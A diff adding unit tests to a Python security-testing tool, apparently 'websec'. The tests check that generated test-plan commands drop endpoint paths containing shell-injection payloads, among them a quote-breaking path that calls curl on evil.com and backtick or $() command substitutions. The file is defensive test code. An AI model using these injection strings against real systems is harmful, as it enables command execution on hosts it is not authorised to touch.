@@ -92,5 +92,34 @@ class TestPlanTests(unittest.TestCase):
         self.assertIn("Phase 1", md)
 
 
+
+
+class ShellSafetyTests(unittest.TestCase):
+    """websec must never hand a user a copy-paste command that executes something unintended."""
+
+    def _plan(self, paths):
+        f = _facts(endpoints=[{"method": "GET", "path": p, "code_path": "a.js",
+                               "params": [{"name": "id", "where": "path"}]} for p in paths],
+                   targeting={"idor_candidates": [f"GET {p}" for p in paths]})
+        return testplan.build(f, inventory.build(f))
+
+    def _commands(self, plan):
+        return " ".join(i["command"] for ph in plan["phases"] for i in ph["items"])
+
+    def test_path_that_breaks_out_of_the_quoting_is_dropped(self):
+        cmds = self._commands(self._plan(['/api/x";curl evil.com;#']))
+        self.assertNotIn("curl evil.com", cmds)
+
+    def test_parameterised_routes_are_still_planned(self):
+        # guard against over-correcting: `{id}` is the most common IDOR-target shape, and rejecting
+        # it would silently strip nearly every endpoint Phase 2 exists to test.
+        cmds = self._commands(self._plan(["/api/orders/{id}"]))
+        self.assertIn("/api/orders/{id}", cmds)
+
+    def test_backtick_and_dollar_paths_are_dropped(self):
+        for bad in ["/api/`whoami`", "/api/$(id)", "/api/a b"]:
+            self.assertEqual(testplan._safe_path(bad), "", bad)
+        self.assertEqual(testplan._safe_path("/api/orders/{id}"), "/api/orders/{id}")
+
 if __name__ == "__main__":
     unittest.main()
